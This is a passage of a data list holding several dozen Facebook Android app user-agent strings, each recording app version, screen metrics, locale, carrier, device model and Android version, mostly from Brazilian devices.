"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259887012;FBDM/{density=2.75,width=1080,height=2110};FBLC/pt_BR;FBRV/0;FBCR/VIVO;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259887012;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/261070278;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886928;FBDM/{density=3.375,width=1080,height=2150};FBLC/pt_BR;FBRV/261137137;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886961;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/261196144;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G610M;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259887012;FBDM/{density=2.75,width=1080,height=2210};FBLC/pt_BR;FBRV/261239212;FBCR/TIM;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886986;FBDM/{density=1.75,width=720,height=1396};FBLC/pt_BR;FBRV/261292134;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886960;FBDM/{density=2.0,width=720,height=1193};FBLC/pt_BR;FBRV/261292134;FBCR/VIVO;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X410.F;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259887012;FBDM/{density=2.75,width=1080,height=2135};FBLC/pt_BR;FBRV/261446601;FBCR/Vivo;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886961;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_Qaau_US;FBRV/261724288;FBCR/TRUE-H;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259887012;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/261724288;FBCR/Oi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476352;FBDM/{density=3.0,width=1080,height=2071};FBLC/pt_BR;FBRV/261865177;FBCR/VIVO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476344;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_Qaau_US;FBRV/0;FBCR/TRUE-H;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886992;FBDM/{density=2.8125,width=1080,height=2192};FBLC/pt_BR;FBRV/261724288;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G985F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476344;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_BR;FBRV/262092279;FBCR/;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476364;FBDM/{density=2.25,width=720,height=1372};FBLC/pt_BR;FBRV/262123733;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886997;FBDM/{density=2.0,width=720,height=1362};FBLC/pt_BR;FBRV/261724288;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476345;FBDM/{density=3.375,width=1080,height=1920};FBLC/es_LA;FBRV/262610602;FBCR/TELCEL;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-N920V;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/251.0.0.31.111;FBBV/188828003;FBDM/{density=2.0,width=720,height=1407};FBLC/en_US;FBRV/0;FBCR/JIO;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1901;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476377;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/262705035;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476343;FBDM/{density=1.9125,width=720,height=1410};FBLC/es_LA;FBRV/262705035;FBCR/Claro AR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e(6) plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476378;FBDM/{density=3.0,width=1080,height=2016};FBLC/es_ES;FBRV/262738434;FBCR/Vivo;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476344;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/262804273;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476378;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/262804273;FBCR/TIM 43 | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476378;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/262804273;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476344;FBDM/{density=3.0,width=1080,height=1794};FBLC/it_IT;FBRV/262902976;FBCR/WINDTRE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/EVA-L09;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476350;FBDM/{density=1.75,width=720,height=1381};FBLC/pt_BR;FBRV/262804273;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476344;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/262902976;FBCR/Oi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G610M;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476377;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/262804273;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A307GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476378;FBDM/{density=2.75,width=1080,height=2138};FBLC/pt_BR;FBRV/263016076;FBCR/Vivo;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi Note 10 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476344;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_BR;FBRV/263054303;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5);FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476344;FBDM/{density=3.375,width=1080,height=1984};FBLC/pt_BR;FBRV/263016076;FBCR/CLARO BR;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-M700;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476378;FBDM/{density=1.75,width=720,height=1396};FBLC/pt_BR;FBRV/263016076;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9600;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476345;FBDM/{density=3.375,width=1080,height=1920};FBLC/en_US;FBRV/263016076;FBCR/Metro by T-Mobile;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/Z982;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476352;FBDM/{density=2.2,width=1080,height=2056};FBLC/ru_RU;FBRV/263016076;FBCR/KYIVSTAR;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618567;FBDM/{density=2.0,width=720,height=1450};FBLC/pt_BR;FBRV/263151032;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9600;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618524;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_GB;FBRV/263075841;FBCR/Virgin;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H850;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618567;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/263286747;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618423;FBDM/{density=3.0,width=1080,height=2016};FBLC/pt_BR;FBRV/263311462;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6);FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476378;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/263016076;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824650;FBDM/{density=2.0,width=720,height=1344};FBLC/pt_BR;FBRV/258179871;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6) play;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618277;FBDM/{density=1.75,width=720,height=1381};FBLC/pt_BR;FBRV/263558974;FBCR/CLARO BR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618516;FBDM/{density=2.0,width=720,height=1193};FBLC/pt_BR;FBRV/263588217;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-M250;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618551;FBDM/{density=2.1000001,width=720,height=1339};FBLC/pt_BR;FBRV/263588217;FBCR/Oi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476235;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_BR;FBRV/262692104;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618516;FBDM/{density=2.25,width=720,height=1332};FBLC/pt_BR;FBRV/263588217;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e5;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618516;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_BR;FBRV/263644901;FBCR/Claro BR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G Play;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618519;FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_BR;FBRV/263644901;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J730G;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618567;FBDM/{density=2.75,width=1080,height=2110};FBLC/pt_BR;FBRV/263717260;FBCR/TIM;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618519;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBRV/263717260;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618519;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/263777783;FBCR/OI | Oi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.0.0.51.129;FBBV/262618441;FBDM/{density=2.75,width=1080,height=2130};FBLC/pt_BR;FBRV/263777783;FBCR/TIM;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723806;FBDM/{density=2.0,width=720,height=1399};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A115M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723806;FBDM/{density=1.75,width=720,height=1411};FBLC/pt_BR;FBRV/264236921;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A115M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723630;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/264436861;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G610M;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723712;FBDM/{density=3.5,width=1440,height=2858};FBLC/pt_BR;FBRV/264457329;FBCR/TIMBRASIL;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-G710;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476378;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/263054303;FBCR/Claro BR;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460630;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/258795302;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723562;FBDM/{density=3.0,width=1080,height=2016};FBLC/pt_BR;FBRV/264685889;FBCR/Vivo;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723712;FBDM/{density=3.5,width=1440,height=2792};FBLC/pt_BR;FBRV/264797148;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723505;FBDM/{density=3.0,width=1080,height=1794};FBLC/it_IT;FBRV/264620244;FBCR/WINDTRE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/WAS-LX1A;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/298.0.0.46.116;FBBV/259886961;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/261724288;FBCR/TIMBRASIL;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 6;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723806;FBDM/{density=1.75,width=720,height=1411};FBLC/pt_BR;FBRV/264843238;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A115M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723605;FBDM/{density=1.5,width=540,height=960};FBLC/pt_BR;FBRV/264983995;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G532MT;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723630;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/264983995;FBCR/GOLAN T;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.1.0.57.129;FBBV/263723619;FBDM/{density=2.0,width=720,height=1344};FBLC/en_GB;FBRV/265184322;FBCR/EE;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e5;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245036;FBDM/{density=3.75,width=1440,height=2780};FBLC/sv_SE;FBRV/266666038;FBCR/ Com Hem;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245027;FBDM/{density=1.75,width=720,height=1411};FBLC/en_US;FBRV/267182455;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A115AZ;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021063;FBDM/{density=1.75,width=720,height=1423};FBLC/es_LA;FBRV/233250654;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205G;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/291.0.0.44.120;FBBV/249604789;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/251279628;FBCR/JIO 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/HM NOTE 1LTE;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342913;FBDM/{density=3.0,width=1080,height=2107};FBLC/de_DE;FBRV/268516016;FBCR/klarmobil;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342877;FBDM/{density=2.0,width=720,height=1424};FBLC/pl_PL;FBRV/268803887;FBCR/T-Mobile.pl;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1903;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946177;FBDM/{density=2.75,width=1080,height=2160};FBLC/en_GB;FBRV/0;FBCR/EE;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 5;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245012;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBRV/268119191;FBCR/Claro;FBMF/M4TEL;FBBD/M4TEL;FBPN/com.facebook.katana;FBDV/M4 SS4450;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946150;FBDM/{density=3.0,width=1080,height=2218};FBLC/de_DE;FBRV/269785748;FBCR/o2 - de+;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SNE-LX1;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946150;FBDM/{density=2.75,width=1080,height=2030};FBLC/cs_CZ;FBRV/269911905;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5 Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245020;FBDM/{density=3.0,width=1080,height=2137};FBLC/es_LA;FBRV/268119191;FBCR/Claro;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JKM-LX3;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946149;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/270254211;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946150;FBDM/{density=3.0,width=1080,height=2040};FBLC/cs_CZ;FBRV/270234409;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/RNE-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946177;FBDM/{density=2.625,width=1080,height=2042};FBLC/cs_CZ;FBRV/270234409;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=3.0,width=1080,height=2110};FBLC/cs_CZ;FBRV/0;FBCR/CEZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946150;FBDM/{density=3.0,width=1080,height=1920};FBLC/cs_CZ;FBRV/270234409;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342885;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/269123057;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803888;FBDM/{density=1.75,width=720,height=1448};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803888;FBDM/{density=1.75,width=720,height=1448};FBLC/cs_CZ;FBRV/0;FBCR/O2-CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946150;FBDM/{density=2.625,width=1080,height=2094};FBLC/cs_CZ;FBRV/270254211;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245014;FBDM/{density=2.0,width=720,height=1358};FBLC/cs_CZ;FBRV/268119191;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ATU-L31;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342878;FBDM/{density=3.0,width=1080,height=2040};FBLC/cs_CZ;FBRV/269123057;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/RNE-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946177;FBDM/{density=2.625,width=1080,height=2131};FBLC/de_DE;FBRV/270234409;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
